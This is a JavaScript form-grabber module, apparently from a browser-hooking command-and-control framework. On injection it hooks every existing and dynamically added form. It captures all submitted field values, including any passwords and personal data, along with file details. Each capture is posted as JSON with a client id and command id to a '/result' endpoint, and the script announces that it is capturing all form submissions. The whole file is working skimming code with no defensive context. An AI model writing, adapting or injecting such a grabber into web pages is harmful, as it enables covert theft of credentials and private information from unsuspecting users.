if (window.__pzFG) return 'already active';
window.__pzFG = true;

function grabForm(form) {
  var data = {
    url: location.href,
    action: form.action || '',
    method: (form.method || 'GET').toUpperCase(),
    enctype: form.enctype || 'application/x-www-form-urlencoded',
    fields: {}
  };
  for (var i = 0; i < form.elements.length; i++) {
    var el = form.elements[i];
    var key = el.name || el.id || (el.tagName.toLowerCase() + '_' + i);
    if (!key) continue;
    var tag = el.tagName.toLowerCase();
    if (tag === 'select') {
      var selected = [];
      for (var j = 0; j < el.options.length; j++) {
        if (el.options[j].selected) selected.push(el.options[j].value);
      }
      data.fields[key] = selected.length === 1 ? selected[0] : selected;
    } else if (el.type === 'checkbox') {
      if (!data.fields[key]) data.fields[key] = [];
      if (el.checked) data.fields[key].push(el.value);
    } else if (el.type === 'radio') {
      if (el.checked) data.fields[key] = el.value;
    } else if (tag === 'textarea') {
      data.fields[key] = el.value;
    } else if (el.type === 'file') {
      var files = [];
      for (var f = 0; f < el.files.length; f++) {
        files.push({ name: el.files[f].name, size: el.files[f].size, type: el.files[f].type });
      }
      data.fields[key] = files;
    } else {
      data.fields[key] = el.value;
    }
  }
  return data;
}

function report(data) {
  fetch('/result', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cid: window.__pzCid, cmd_id: 'formgrab', result: data })
  });
}

function hookForm(form) {
  if (form.__pzFGH) return;
  form.__pzFGH = true;
  form.addEventListener('submit', function () {
    report(grabForm(form));
  }, true);
}

// Hook all existing forms
document.querySelectorAll('form').forEach(hookForm);

// Global submit interceptor as fallback
document.addEventListener('submit', function (e) {
  if (e.target.tagName && e.target.tagName.toLowerCase() === 'form') {
    hookForm(e.target);
    report(grabForm(e.target));
  }
}, true);

// Watch for dynamically added forms
var obs = new MutationObserver(function (muts) {
  muts.forEach(function (m) {
    m.addedNodes.forEach(function (n) {
      if (n.nodeType !== 1) return;
      if (n.tagName && n.tagName.toLowerCase() === 'form') hookForm(n);
      if (n.querySelectorAll) n.querySelectorAll('form').forEach(hookForm);
    });
  });
});
obs.observe(document.body, { childList: true, subtree: true });

return 'form grabber active — capturing all form submissions';
